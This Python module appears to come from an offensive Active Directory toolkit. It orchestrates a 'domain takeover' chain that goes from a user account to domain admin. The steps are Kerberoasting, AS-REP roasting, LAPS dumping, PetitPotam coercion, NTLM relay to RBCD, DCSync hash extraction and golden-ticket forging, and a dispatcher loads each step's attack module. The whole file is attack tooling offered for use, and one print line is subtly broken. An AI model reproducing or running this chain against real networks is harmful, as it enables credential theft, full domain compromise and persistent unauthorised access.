"""Full domain takeover campaign — automated attack chain from user to DA."""
from __future__ import annotations
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.campaign.domain_takeover.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["multiple_attacks"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1078.002"],
}

ATTACK_CHAIN = [
    ("1. Enumerate", "bloodhound_collect", "Map attack paths"),
    ("2. Kerberoast", "kerberoast_adv", "Extract service account hashes"),
    ("3. AS-REP Roast", "asreproast", "Check pre-auth disabled accounts"),
    ("4. LAPS/gMSA", "laps_dump", "Extract managed passwords"),
    ("5. Coercion", "petitpotam", "Force NTLM auth for relay"),
    ("6. Relay → RBCD", "ntlmrelayx_auto", "Relay to LDAP for delegation"),
    ("7. DCSync", "secretsdump_exec", "Extract all hashes"),
    ("8. Golden Ticket", "golden_ticket", "Forge persistent TGT"),
]


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    dc_ip = getattr(args, "dc_ip", args.target)
    auto = getattr(args, "auto", False)
    step = getattr(args, "step", None)

    print("[*] Domain Takeover Campaign → {} ({})".format(args.domain, dc_ip))
    print("[*] Credentials: {}\\{}".format(cred.domain, cred.username))
    print()

    if not auto and not step:
        print("[*] Attack chain (use --step N or --auto):")
        for label, module, desc in ATTACK_CHAIN:
            print("  {} — {} ({})".format(label, desc, module))
        print("\n[*] Use --auto for full automated chain")
        print("[*] Use --step 1..8 for specific step")
        return 0

    if step:
        idx = int(step) - 1
        if 0 <= idx < len(ATTACK_CHAIN):
            label, module, desc = ATTACK_CHAIN[idx]
            print("[*] Executing step: {} — {}".format(label, desc))
            import importlib
            mod_path = "adxpl.modules.{}".format(_module_to_path(module))
            try:
                mod = importlib.import_module(mod_path)
                return mod.run(args)
            except ImportError:
                print("[-] Module {} not found".format(mod_path))
                return 1

    if auto:
        print("[*] Running automated attack chain...")
        for label, module, desc in ATTACK_CHAIN:
            print("\n{'='*60}")
            print("[*] {}".format(label))
            print("  {}".format(desc))
            print("[*] Module: {}".format(module))
            print("[*] (execute each step with --step N for controlled execution)")
        print("\n[!] Auto mode prints the chain — execute steps individually for safety")
    return 0


def _module_to_path(module_name: str) -> str:
    mapping = {
        "bloodhound_collect": "enumeration.bloodhound_collect",
        "kerberoast_adv": "attack.kerberoast_adv",
        "asreproast": "attack.asreproast",
        "laps_dump": "enumeration.laps_dump",
        "petitpotam": "coercion.petitpotam",
        "ntlmrelayx_auto": "relay.ntlmrelayx_auto",
        "secretsdump_exec": "credential.secretsdump_exec",
        "golden_ticket": "attack.golden_ticket",
    }
    return mapping.get(module_name, module_name)
